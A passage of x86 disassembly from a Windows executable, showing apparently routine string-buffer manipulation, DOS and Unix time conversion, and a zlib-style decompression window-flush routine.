  403fdf:	03 45 0c             	add    0xc(%ebp),%eax
  403fe2:	53                   	push   %ebx
  403fe3:	50                   	push   %eax
  403fe4:	8b 46 10             	mov    0x10(%esi),%eax
  403fe7:	03 c1                	add    %ecx,%eax
  403fe9:	50                   	push   %eax
  403fea:	e8 61 a1 01 00       	call   0x41e150
  403fef:	83 c4 0c             	add    $0xc,%esp
  403ff2:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403ff6:	89 7e 10             	mov    %edi,0x10(%esi)
  403ff9:	72 04                	jb     0x403fff
  403ffb:	8b 06                	mov    (%esi),%eax
  403ffd:	eb 02                	jmp    0x404001
  403fff:	8b c6                	mov    %esi,%eax
  404001:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  404005:	5f                   	pop    %edi
  404006:	8b c6                	mov    %esi,%eax
  404008:	5e                   	pop    %esi
  404009:	5b                   	pop    %ebx
  40400a:	5d                   	pop    %ebp
  40400b:	c2 0c 00             	ret    $0xc
  40400e:	55                   	push   %ebp
  40400f:	8b ec                	mov    %esp,%ebp
  404011:	53                   	push   %ebx
  404012:	56                   	push   %esi
  404013:	8b f1                	mov    %ecx,%esi
  404015:	8b 4e 10             	mov    0x10(%esi),%ecx
  404018:	57                   	push   %edi
  404019:	8b 7d 08             	mov    0x8(%ebp),%edi
  40401c:	3b cf                	cmp    %edi,%ecx
  40401e:	0f 82 fb 00 00 00    	jb     0x40411f
  404024:	8b 45 0c             	mov    0xc(%ebp),%eax
  404027:	8b 40 10             	mov    0x10(%eax),%eax
  40402a:	3b 45 10             	cmp    0x10(%ebp),%eax
  40402d:	0f 82 ec 00 00 00    	jb     0x40411f
  404033:	2b 45 10             	sub    0x10(%ebp),%eax
  404036:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404039:	3b c3                	cmp    %ebx,%eax
  40403b:	73 05                	jae    0x404042
  40403d:	8b d8                	mov    %eax,%ebx
  40403f:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404042:	83 c8 ff             	or     $0xffffffff,%eax
  404045:	2b c1                	sub    %ecx,%eax
  404047:	3b c3                	cmp    %ebx,%eax
  404049:	77 0a                	ja     0x404055
  40404b:	68 7c 6a 43 00       	push   $0x436a7c
  404050:	e8 26 94 01 00       	call   0x41d47b
  404055:	85 db                	test   %ebx,%ebx
  404057:	0f 84 b9 00 00 00    	je     0x404116
  40405d:	03 cb                	add    %ebx,%ecx
  40405f:	6a 00                	push   $0x0
  404061:	89 4d 08             	mov    %ecx,0x8(%ebp)
  404064:	51                   	push   %ecx
  404065:	8b ce                	mov    %esi,%ecx
  404067:	e8 a6 fe ff ff       	call   0x403f12
  40406c:	84 c0                	test   %al,%al
  40406e:	0f 84 a2 00 00 00    	je     0x404116
  404074:	8b 46 14             	mov    0x14(%esi),%eax
  404077:	83 f8 10             	cmp    $0x10,%eax
  40407a:	72 04                	jb     0x404080
  40407c:	8b 0e                	mov    (%esi),%ecx
  40407e:	eb 02                	jmp    0x404082
  404080:	8b ce                	mov    %esi,%ecx
  404082:	83 f8 10             	cmp    $0x10,%eax
  404085:	72 04                	jb     0x40408b
  404087:	8b 06                	mov    (%esi),%eax
  404089:	eb 02                	jmp    0x40408d
  40408b:	8b c6                	mov    %esi,%eax
  40408d:	8b 56 10             	mov    0x10(%esi),%edx
  404090:	2b d7                	sub    %edi,%edx
  404092:	52                   	push   %edx
  404093:	03 cf                	add    %edi,%ecx
  404095:	03 c7                	add    %edi,%eax
  404097:	51                   	push   %ecx
  404098:	03 c3                	add    %ebx,%eax
  40409a:	50                   	push   %eax
  40409b:	e8 f0 a5 01 00       	call   0x41e690
  4040a0:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4040a3:	83 c4 0c             	add    $0xc,%esp
  4040a6:	3b f1                	cmp    %ecx,%esi
  4040a8:	75 32                	jne    0x4040dc
  4040aa:	8b 55 10             	mov    0x10(%ebp),%edx
  4040ad:	3b fa                	cmp    %edx,%edi
  4040af:	73 02                	jae    0x4040b3
  4040b1:	03 d3                	add    %ebx,%edx
  4040b3:	8b 46 14             	mov    0x14(%esi),%eax
  4040b6:	83 f8 10             	cmp    $0x10,%eax
  4040b9:	72 04                	jb     0x4040bf
  4040bb:	8b 0e                	mov    (%esi),%ecx
  4040bd:	eb 02                	jmp    0x4040c1
  4040bf:	8b ce                	mov    %esi,%ecx
  4040c1:	83 f8 10             	cmp    $0x10,%eax
  4040c4:	72 04                	jb     0x4040ca
  4040c6:	8b 06                	mov    (%esi),%eax
  4040c8:	eb 02                	jmp    0x4040cc
  4040ca:	8b c6                	mov    %esi,%eax
  4040cc:	ff 75 14             	push   0x14(%ebp)
  4040cf:	03 ca                	add    %edx,%ecx
  4040d1:	51                   	push   %ecx
  4040d2:	03 c7                	add    %edi,%eax
  4040d4:	50                   	push   %eax
  4040d5:	e8 b6 a5 01 00       	call   0x41e690
  4040da:	eb 21                	jmp    0x4040fd
  4040dc:	83 79 14 10          	cmpl   $0x10,0x14(%ecx)
  4040e0:	72 02                	jb     0x4040e4
  4040e2:	8b 09                	mov    (%ecx),%ecx
  4040e4:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4040e8:	72 04                	jb     0x4040ee
  4040ea:	8b 06                	mov    (%esi),%eax
  4040ec:	eb 02                	jmp    0x4040f0
  4040ee:	8b c6                	mov    %esi,%eax
  4040f0:	03 4d 10             	add    0x10(%ebp),%ecx
  4040f3:	53                   	push   %ebx
  4040f4:	51                   	push   %ecx
  4040f5:	03 c7                	add    %edi,%eax
  4040f7:	50                   	push   %eax
  4040f8:	e8 53 a0 01 00       	call   0x41e150
  4040fd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404100:	83 c4 0c             	add    $0xc,%esp
  404103:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  404107:	89 4e 10             	mov    %ecx,0x10(%esi)
  40410a:	72 04                	jb     0x404110
  40410c:	8b 06                	mov    (%esi),%eax
  40410e:	eb 02                	jmp    0x404112
  404110:	8b c6                	mov    %esi,%eax
  404112:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  404116:	5f                   	pop    %edi
  404117:	8b c6                	mov    %esi,%eax
  404119:	5e                   	pop    %esi
  40411a:	5b                   	pop    %ebx
  40411b:	5d                   	pop    %ebp
  40411c:	c2 10 00             	ret    $0x10
  40411f:	68 50 6a 43 00       	push   $0x436a50
  404124:	e8 9f 93 01 00       	call   0x41d4c8
  404129:	cc                   	int3
  40412a:	55                   	push   %ebp
  40412b:	8b ec                	mov    %esp,%ebp
  40412d:	56                   	push   %esi
  40412e:	57                   	push   %edi
  40412f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404132:	57                   	push   %edi
  404133:	8b f1                	mov    %ecx,%esi
  404135:	e8 9b fb ff ff       	call   0x403cd5
  40413a:	84 c0                	test   %al,%al
  40413c:	74 22                	je     0x404160
  40413e:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  404142:	72 04                	jb     0x404148
  404144:	8b 06                	mov    (%esi),%eax
  404146:	eb 02                	jmp    0x40414a
  404148:	8b c6                	mov    %esi,%eax
  40414a:	ff 75 10             	push   0x10(%ebp)
  40414d:	2b f8                	sub    %eax,%edi
  40414f:	57                   	push   %edi
  404150:	56                   	push   %esi
  404151:	ff 75 08             	push   0x8(%ebp)
  404154:	8b ce                	mov    %esi,%ecx
  404156:	e8 b3 fe ff ff       	call   0x40400e
  40415b:	e9 a3 00 00 00       	jmp    0x404203
  404160:	8b 46 10             	mov    0x10(%esi),%eax
  404163:	8b 7d 08             	mov    0x8(%ebp),%edi
  404166:	3b c7                	cmp    %edi,%eax
  404168:	73 0a                	jae    0x404174
  40416a:	68 50 6a 43 00       	push   $0x436a50
  40416f:	e8 54 93 01 00       	call   0x41d4c8
  404174:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404177:	83 ca ff             	or     $0xffffffff,%edx
  40417a:	2b d0                	sub    %eax,%edx
  40417c:	3b d1                	cmp    %ecx,%edx
  40417e:	77 0a                	ja     0x40418a
  404180:	68 7c 6a 43 00       	push   $0x436a7c
  404185:	e8 f1 92 01 00       	call   0x41d47b
  40418a:	85 c9                	test   %ecx,%ecx
  40418c:	74 73                	je     0x404201
  40418e:	53                   	push   %ebx
  40418f:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  404192:	6a 00                	push   $0x0
  404194:	53                   	push   %ebx
  404195:	8b ce                	mov    %esi,%ecx
  404197:	e8 76 fd ff ff       	call   0x403f12
  40419c:	84 c0                	test   %al,%al
  40419e:	74 60                	je     0x404200
  4041a0:	8b 46 14             	mov    0x14(%esi),%eax
  4041a3:	83 f8 10             	cmp    $0x10,%eax
  4041a6:	72 04                	jb     0x4041ac
  4041a8:	8b 0e                	mov    (%esi),%ecx
  4041aa:	eb 02                	jmp    0x4041ae
  4041ac:	8b ce                	mov    %esi,%ecx
  4041ae:	83 f8 10             	cmp    $0x10,%eax
  4041b1:	72 04                	jb     0x4041b7
  4041b3:	8b 06                	mov    (%esi),%eax
  4041b5:	eb 02                	jmp    0x4041b9
  4041b7:	8b c6                	mov    %esi,%eax
  4041b9:	8b 56 10             	mov    0x10(%esi),%edx
  4041bc:	2b d7                	sub    %edi,%edx
  4041be:	52                   	push   %edx
  4041bf:	03 c7                	add    %edi,%eax
  4041c1:	03 45 10             	add    0x10(%ebp),%eax
  4041c4:	03 cf                	add    %edi,%ecx
  4041c6:	51                   	push   %ecx
  4041c7:	50                   	push   %eax
  4041c8:	e8 c3 a4 01 00       	call   0x41e690
  4041cd:	83 c4 0c             	add    $0xc,%esp
  4041d0:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4041d4:	72 04                	jb     0x4041da
  4041d6:	8b 06                	mov    (%esi),%eax
  4041d8:	eb 02                	jmp    0x4041dc
  4041da:	8b c6                	mov    %esi,%eax
  4041dc:	ff 75 10             	push   0x10(%ebp)
  4041df:	03 c7                	add    %edi,%eax
  4041e1:	ff 75 0c             	push   0xc(%ebp)
  4041e4:	50                   	push   %eax
  4041e5:	e8 66 9f 01 00       	call   0x41e150
  4041ea:	83 c4 0c             	add    $0xc,%esp
  4041ed:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4041f1:	89 5e 10             	mov    %ebx,0x10(%esi)
  4041f4:	72 04                	jb     0x4041fa
  4041f6:	8b 06                	mov    (%esi),%eax
  4041f8:	eb 02                	jmp    0x4041fc
  4041fa:	8b c6                	mov    %esi,%eax
  4041fc:	c6 04 18 00          	movb   $0x0,(%eax,%ebx,1)
  404200:	5b                   	pop    %ebx
  404201:	8b c6                	mov    %esi,%eax
  404203:	5f                   	pop    %edi
  404204:	5e                   	pop    %esi
  404205:	5d                   	pop    %ebp
  404206:	c2 0c 00             	ret    $0xc
  404209:	55                   	push   %ebp
  40420a:	8b ec                	mov    %esp,%ebp
  40420c:	53                   	push   %ebx
  40420d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404210:	8b 43 10             	mov    0x10(%ebx),%eax
  404213:	56                   	push   %esi
  404214:	8b f1                	mov    %ecx,%esi
  404216:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404219:	57                   	push   %edi
  40421a:	3b c1                	cmp    %ecx,%eax
  40421c:	73 0a                	jae    0x404228
  40421e:	68 50 6a 43 00       	push   $0x436a50
  404223:	e8 a0 92 01 00       	call   0x41d4c8
  404228:	2b c1                	sub    %ecx,%eax
  40422a:	8b f8                	mov    %eax,%edi
  40422c:	39 7d 10             	cmp    %edi,0x10(%ebp)
  40422f:	73 03                	jae    0x404234
  404231:	8b 7d 10             	mov    0x10(%ebp),%edi
  404234:	3b f3                	cmp    %ebx,%esi
  404236:	75 1a                	jne    0x404252
  404238:	03 f9                	add    %ecx,%edi
  40423a:	6a ff                	push   $0xffffffff
  40423c:	57                   	push   %edi
  40423d:	8b ce                	mov    %esi,%ecx
  40423f:	e8 29 fb ff ff       	call   0x403d6d
  404244:	ff 75 0c             	push   0xc(%ebp)
  404247:	8b ce                	mov    %esi,%ecx
  404249:	6a 00                	push   $0x0
  40424b:	e8 1d fb ff ff       	call   0x403d6d
  404250:	eb 47                	jmp    0x404299
  404252:	6a 00                	push   $0x0
  404254:	57                   	push   %edi
  404255:	8b ce                	mov    %esi,%ecx
  404257:	e8 b6 fc ff ff       	call   0x403f12
  40425c:	84 c0                	test   %al,%al
  40425e:	74 39                	je     0x404299
  404260:	83 7b 14 10          	cmpl   $0x10,0x14(%ebx)
  404264:	72 04                	jb     0x40426a
  404266:	8b 03                	mov    (%ebx),%eax
  404268:	eb 02                	jmp    0x40426c
  40426a:	8b c3                	mov    %ebx,%eax
  40426c:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  404270:	72 04                	jb     0x404276
  404272:	8b 0e                	mov    (%esi),%ecx
  404274:	eb 02                	jmp    0x404278
  404276:	8b ce                	mov    %esi,%ecx
  404278:	03 45 0c             	add    0xc(%ebp),%eax
  40427b:	57                   	push   %edi
  40427c:	50                   	push   %eax
  40427d:	51                   	push   %ecx
  40427e:	e8 cd 9e 01 00       	call   0x41e150
  404283:	83 c4 0c             	add    $0xc,%esp
  404286:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  40428a:	89 7e 10             	mov    %edi,0x10(%esi)
  40428d:	72 04                	jb     0x404293
  40428f:	8b 06                	mov    (%esi),%eax
  404291:	eb 02                	jmp    0x404295
  404293:	8b c6                	mov    %esi,%eax
  404295:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  404299:	5f                   	pop    %edi
  40429a:	8b c6                	mov    %esi,%eax
  40429c:	5e                   	pop    %esi
  40429d:	5b                   	pop    %ebx
  40429e:	5d                   	pop    %ebp
  40429f:	c2 0c 00             	ret    $0xc
  4042a2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4042a6:	8d 50 01             	lea    0x1(%eax),%edx
  4042a9:	53                   	push   %ebx
  4042aa:	8a 18                	mov    (%eax),%bl
  4042ac:	40                   	inc    %eax
  4042ad:	84 db                	test   %bl,%bl
  4042af:	75 f9                	jne    0x4042aa
  4042b1:	2b c2                	sub    %edx,%eax
  4042b3:	50                   	push   %eax
  4042b4:	ff 74 24 10          	push   0x10(%esp)
  4042b8:	ff 74 24 10          	push   0x10(%esp)
  4042bc:	e8 69 fe ff ff       	call   0x40412a
  4042c1:	5b                   	pop    %ebx
  4042c2:	c2 08 00             	ret    $0x8
  4042c5:	56                   	push   %esi
  4042c6:	33 c0                	xor    %eax,%eax
  4042c8:	6a ff                	push   $0xffffffff
  4042ca:	8b f1                	mov    %ecx,%esi
  4042cc:	50                   	push   %eax
  4042cd:	ff 74 24 10          	push   0x10(%esp)
  4042d1:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4042d8:	89 46 10             	mov    %eax,0x10(%esi)
  4042db:	88 06                	mov    %al,(%esi)
  4042dd:	e8 27 ff ff ff       	call   0x404209
  4042e2:	8b c6                	mov    %esi,%eax
  4042e4:	5e                   	pop    %esi
  4042e5:	c2 04 00             	ret    $0x4
  4042e8:	53                   	push   %ebx
  4042e9:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4042ed:	56                   	push   %esi
  4042ee:	53                   	push   %ebx
  4042ef:	8b f1                	mov    %ecx,%esi
  4042f1:	e8 df f9 ff ff       	call   0x403cd5
  4042f6:	84 c0                	test   %al,%al
  4042f8:	74 1d                	je     0x404317
  4042fa:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4042fe:	72 04                	jb     0x404304
  404300:	8b 06                	mov    (%esi),%eax
  404302:	eb 02                	jmp    0x404306
  404304:	8b c6                	mov    %esi,%eax
  404306:	ff 74 24 10          	push   0x10(%esp)
  40430a:	2b d8                	sub    %eax,%ebx
  40430c:	53                   	push   %ebx
  40430d:	56                   	push   %esi
  40430e:	8b ce                	mov    %esi,%ecx
  404310:	e8 f4 fe ff ff       	call   0x404209
  404315:	eb 40                	jmp    0x404357
  404317:	57                   	push   %edi
  404318:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40431c:	6a 00                	push   $0x0
  40431e:	57                   	push   %edi
  40431f:	8b ce                	mov    %esi,%ecx
  404321:	e8 ec fb ff ff       	call   0x403f12
  404326:	84 c0                	test   %al,%al
  404328:	74 2a                	je     0x404354
  40432a:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  40432e:	72 04                	jb     0x404334
  404330:	8b 06                	mov    (%esi),%eax
  404332:	eb 02                	jmp    0x404336
  404334:	8b c6                	mov    %esi,%eax
  404336:	57                   	push   %edi
  404337:	53                   	push   %ebx
  404338:	50                   	push   %eax
  404339:	e8 12 9e 01 00       	call   0x41e150
  40433e:	83 c4 0c             	add    $0xc,%esp
  404341:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  404345:	89 7e 10             	mov    %edi,0x10(%esi)
  404348:	72 04                	jb     0x40434e
  40434a:	8b 06                	mov    (%esi),%eax
  40434c:	eb 02                	jmp    0x404350
  40434e:	8b c6                	mov    %esi,%eax
  404350:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  404354:	8b c6                	mov    %esi,%eax
  404356:	5f                   	pop    %edi
  404357:	5e                   	pop    %esi
  404358:	5b                   	pop    %ebx
  404359:	c2 08 00             	ret    $0x8
  40435c:	8b 44 24 04          	mov    0x4(%esp),%eax
  404360:	56                   	push   %esi
  404361:	8b f1                	mov    %ecx,%esi
  404363:	8d 50 01             	lea    0x1(%eax),%edx
  404366:	8a 08                	mov    (%eax),%cl
  404368:	40                   	inc    %eax
  404369:	84 c9                	test   %cl,%cl
  40436b:	75 f9                	jne    0x404366
  40436d:	2b c2                	sub    %edx,%eax
  40436f:	50                   	push   %eax
  404370:	ff 74 24 0c          	push   0xc(%esp)
  404374:	8b ce                	mov    %esi,%ecx
  404376:	e8 6d ff ff ff       	call   0x4042e8
  40437b:	5e                   	pop    %esi
  40437c:	c2 04 00             	ret    $0x4
  40437f:	56                   	push   %esi
  404380:	ff 74 24 08          	push   0x8(%esp)
  404384:	8b f1                	mov    %ecx,%esi
  404386:	83 66 10 00          	andl   $0x0,0x10(%esi)
  40438a:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  404391:	c6 06 00             	movb   $0x0,(%esi)
  404394:	e8 c3 ff ff ff       	call   0x40435c
  404399:	8b c6                	mov    %esi,%eax
  40439b:	5e                   	pop    %esi
  40439c:	c2 04 00             	ret    $0x4
  40439f:	56                   	push   %esi
  4043a0:	8b 74 24 08          	mov    0x8(%esp),%esi
  4043a4:	57                   	push   %edi
  4043a5:	8b f9                	mov    %ecx,%edi
  4043a7:	3b fe                	cmp    %esi,%edi
  4043a9:	74 3b                	je     0x4043e6
  4043ab:	6a 00                	push   $0x0
  4043ad:	6a 01                	push   $0x1
  4043af:	e8 2f fa ff ff       	call   0x403de3
  4043b4:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4043b8:	73 11                	jae    0x4043cb
  4043ba:	8b 46 10             	mov    0x10(%esi),%eax
  4043bd:	40                   	inc    %eax
  4043be:	50                   	push   %eax
  4043bf:	56                   	push   %esi
  4043c0:	57                   	push   %edi
  4043c1:	e8 ca a2 01 00       	call   0x41e690
  4043c6:	83 c4 0c             	add    $0xc,%esp
  4043c9:	eb 07                	jmp    0x4043d2
  4043cb:	8b 06                	mov    (%esi),%eax
  4043cd:	89 07                	mov    %eax,(%edi)
  4043cf:	83 26 00             	andl   $0x0,(%esi)
  4043d2:	8b 46 10             	mov    0x10(%esi),%eax
  4043d5:	89 47 10             	mov    %eax,0x10(%edi)
  4043d8:	8b 46 14             	mov    0x14(%esi),%eax
  4043db:	89 47 14             	mov    %eax,0x14(%edi)
  4043de:	83 66 10 00          	andl   $0x0,0x10(%esi)
  4043e2:	83 66 14 00          	andl   $0x0,0x14(%esi)
  4043e6:	8b c7                	mov    %edi,%eax
  4043e8:	5f                   	pop    %edi
  4043e9:	5e                   	pop    %esi
  4043ea:	c2 04 00             	ret    $0x4
  4043ed:	56                   	push   %esi
  4043ee:	ff 74 24 08          	push   0x8(%esp)
  4043f2:	8b f1                	mov    %ecx,%esi
  4043f4:	83 66 10 00          	andl   $0x0,0x10(%esi)
  4043f8:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4043ff:	c6 06 00             	movb   $0x0,(%esi)
  404402:	e8 98 ff ff ff       	call   0x40439f
  404407:	8b c6                	mov    %esi,%eax
  404409:	5e                   	pop    %esi
  40440a:	c2 04 00             	ret    $0x4
  40440d:	55                   	push   %ebp
  40440e:	8b ec                	mov    %esp,%ebp
  404410:	51                   	push   %ecx
  404411:	ff 75 0c             	push   0xc(%ebp)
  404414:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404417:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40441b:	6a 00                	push   $0x0
  40441d:	e8 80 fe ff ff       	call   0x4042a2
  404422:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404425:	50                   	push   %eax
  404426:	e8 c2 ff ff ff       	call   0x4043ed
  40442b:	8b 45 08             	mov    0x8(%ebp),%eax
  40442e:	c9                   	leave
  40442f:	c3                   	ret
  404430:	55                   	push   %ebp
  404431:	8b ec                	mov    %esp,%ebp
  404433:	51                   	push   %ecx
  404434:	8b 45 0c             	mov    0xc(%ebp),%eax
  404437:	8b 50 10             	mov    0x10(%eax),%edx
  40443a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40443d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404441:	53                   	push   %ebx
  404442:	8b 58 14             	mov    0x14(%eax),%ebx
  404445:	56                   	push   %esi
  404446:	8b 71 10             	mov    0x10(%ecx),%esi
  404449:	2b da                	sub    %edx,%ebx
  40444b:	3b f3                	cmp    %ebx,%esi
  40444d:	76 17                	jbe    0x404466
  40444f:	8b 59 14             	mov    0x14(%ecx),%ebx
  404452:	2b de                	sub    %esi,%ebx
  404454:	3b da                	cmp    %edx,%ebx
  404456:	72 0e                	jb     0x404466
  404458:	6a ff                	push   $0xffffffff
  40445a:	6a 00                	push   $0x0
  40445c:	50                   	push   %eax
  40445d:	6a 00                	push   $0x0
  40445f:	e8 aa fb ff ff       	call   0x40400e
  404464:	eb 0c                	jmp    0x404472
  404466:	6a ff                	push   $0xffffffff
  404468:	6a 00                	push   $0x0
  40446a:	51                   	push   %ecx
  40446b:	8b c8                	mov    %eax,%ecx
  40446d:	e8 02 fb ff ff       	call   0x403f74
  404472:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404475:	50                   	push   %eax
  404476:	e8 72 ff ff ff       	call   0x4043ed
  40447b:	8b 45 08             	mov    0x8(%ebp),%eax
  40447e:	5e                   	pop    %esi
  40447f:	5b                   	pop    %ebx
  404480:	c9                   	leave
  404481:	c3                   	ret
  404482:	6a 01                	push   $0x1
  404484:	6a 00                	push   $0x0
  404486:	6a 00                	push   $0x0
  404488:	ff 74 24 10          	push   0x10(%esp)
  40448c:	ff 15 70 2e 45 00    	call   *0x452e70
  404492:	c3                   	ret
  404493:	8b 44 24 04          	mov    0x4(%esp),%eax
  404497:	99                   	cltd
  404498:	6a 00                	push   $0x0
  40449a:	05 00 91 10 b6       	add    $0xb6109100,%eax
  40449f:	68 80 96 98 00       	push   $0x989680
  4044a4:	83 d2 02             	adc    $0x2,%edx
  4044a7:	52                   	push   %edx
  4044a8:	50                   	push   %eax
  4044a9:	e8 12 af 01 00       	call   0x41f3c0
  4044ae:	8b ca                	mov    %edx,%ecx
  4044b0:	c1 f9 1f             	sar    $0x1f,%ecx
  4044b3:	c3                   	ret
  4044b4:	55                   	push   %ebp
  4044b5:	8b ec                	mov    %esp,%ebp
  4044b7:	83 ec 1c             	sub    $0x1c,%esp
  4044ba:	a1 a0 06 44 00       	mov    0x4406a0,%eax
  4044bf:	33 c5                	xor    %ebp,%eax
  4044c1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4044c4:	66 8b 45 08          	mov    0x8(%ebp),%ax
  4044c8:	66 c1 e8 09          	shr    $0x9,%ax
  4044cc:	b9 bc 07 00 00       	mov    $0x7bc,%ecx
  4044d1:	66 03 c1             	add    %cx,%ax
  4044d4:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
  4044d8:	8b 45 08             	mov    0x8(%ebp),%eax
  4044db:	c1 e8 05             	shr    $0x5,%eax
  4044de:	83 e0 0f             	and    $0xf,%eax
  4044e1:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
  4044e5:	8b 45 08             	mov    0x8(%ebp),%eax
  4044e8:	83 e0 1f             	and    $0x1f,%eax
  4044eb:	66 89 45 f2          	mov    %ax,-0xe(%ebp)
  4044ef:	8b 45 0c             	mov    0xc(%ebp),%eax
  4044f2:	66 8b c8             	mov    %ax,%cx
  4044f5:	66 c1 e9 0b          	shr    $0xb,%cx
  4044f9:	66 89 4d f4          	mov    %cx,-0xc(%ebp)
  4044fd:	8b c8                	mov    %eax,%ecx
  4044ff:	83 e0 1f             	and    $0x1f,%eax
  404502:	03 c0                	add    %eax,%eax
  404504:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
  404508:	33 c0                	xor    %eax,%eax
  40450a:	66 89 45 fa          	mov    %ax,-0x6(%ebp)
  40450e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404511:	50                   	push   %eax
  404512:	c1 e9 05             	shr    $0x5,%ecx
  404515:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404518:	83 e1 3f             	and    $0x3f,%ecx
  40451b:	50                   	push   %eax
  40451c:	66 89 4d f6          	mov    %cx,-0xa(%ebp)
  404520:	ff 15 64 2f 45 00    	call   *0x452f64
  404526:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404529:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40452c:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40452f:	33 cd                	xor    %ebp,%ecx
  404531:	e8 04 9b 01 00       	call   0x41e03a
  404536:	c9                   	leave
  404537:	c3                   	ret
  404538:	55                   	push   %ebp
  404539:	8b ec                	mov    %esp,%ebp
  40453b:	51                   	push   %ecx
  40453c:	53                   	push   %ebx
  40453d:	56                   	push   %esi
  40453e:	8b 75 08             	mov    0x8(%ebp),%esi
  404541:	8b 4e 30             	mov    0x30(%esi),%ecx
  404544:	8b 5e 34             	mov    0x34(%esi),%ebx
  404547:	57                   	push   %edi
  404548:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40454b:	8b 47 0c             	mov    0xc(%edi),%eax
  40454e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404551:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404554:	3b cb                	cmp    %ebx,%ecx
  404556:	76 03                	jbe    0x40455b
  404558:	8b 5e 2c             	mov    0x2c(%esi),%ebx
  40455b:	8b 47 10             	mov    0x10(%edi),%eax
  40455e:	2b d9                	sub    %ecx,%ebx
  404560:	3b d8                	cmp    %eax,%ebx
  404562:	76 02                	jbe    0x404566
  404564:	8b d8                	mov    %eax,%ebx
  404566:	85 db                	test   %ebx,%ebx
  404568:	74 0a                	je     0x404574
  40456a:	83 7d 10 fb          	cmpl   $0xfffffffb,0x10(%ebp)
  40456e:	75 04                	jne    0x404574
  404570:	83 65 10 00          	andl   $0x0,0x10(%ebp)
  404574:	01 5f 14             	add    %ebx,0x14(%edi)
  404577:	2b c3                	sub    %ebx,%eax
  404579:	89 47 10             	mov    %eax,0x10(%edi)
  40457c:	8b 46 38             	mov    0x38(%esi),%eax
  40457f:	85 c0                	test   %eax,%eax
  404581:	74 10                	je     0x404593
  404583:	53                   	push   %ebx
  404584:	51                   	push   %ecx
  404585:	ff 76 3c             	push   0x3c(%esi)
  404588:	ff d0                	call   *%eax
  40458a:	89 46 3c             	mov    %eax,0x3c(%esi)
  40458d:	83 c4 0c             	add    $0xc,%esp
  404590:	89 47 30             	mov    %eax,0x30(%edi)
  404593:	85 db                	test   %ebx,%ebx
  404595:	74 15                	je     0x4045ac
  404597:	53                   	push   %ebx
  404598:	ff 75 0c             	push   0xc(%ebp)
  40459b:	ff 75 fc             	push   -0x4(%ebp)
  40459e:	e8 ad 9b 01 00       	call   0x41e150
  4045a3:	01 5d fc             	add    %ebx,-0x4(%ebp)
  4045a6:	83 c4 0c             	add    $0xc,%esp
  4045a9:	01 5d 0c             	add    %ebx,0xc(%ebp)
  4045ac:	8b 46 2c             	mov    0x2c(%esi),%eax
  4045af:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4045b2:	75 62                	jne    0x404616
  4045b4:	8b 4e 28             	mov    0x28(%esi),%ecx
  4045b7:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4045ba:	39 46 34             	cmp    %eax,0x34(%esi)
  4045bd:	75 03                	jne    0x4045c2
  4045bf:	89 4e 34             	mov    %ecx,0x34(%esi)
  4045c2:	8b 5e 34             	mov    0x34(%esi),%ebx
  4045c5:	8b 47 10             	mov    0x10(%edi),%eax
  4045c8:	2b d9                	sub    %ecx,%ebx
  4045ca:	3b d8                	cmp    %eax,%ebx
  4045cc:	76 02                	jbe    0x4045d0
  4045ce:	8b d8                	mov    %eax,%ebx
  4045d0:	85 db                	test   %ebx,%ebx
  4045d2:	74 0a                	je     0x4045de
  4045d4:	83 7d 10 fb          	cmpl   $0xfffffffb,0x10(%ebp)
  4045d8:	75 04                	jne    0x4045de
  4045da:	83 65 10 00          	andl   $0x0,0x10(%ebp)
  4045de:	01 5f 14             	add    %ebx,0x14(%edi)
  4045e1:	2b c3                	sub    %ebx,%eax
  4045e3:	89 47 10             	mov    %eax,0x10(%edi)
  4045e6:	8b 46 38             	mov    0x38(%esi),%eax
  4045e9:	85 c0                	test   %eax,%eax
  4045eb:	74 10                	je     0x4045fd
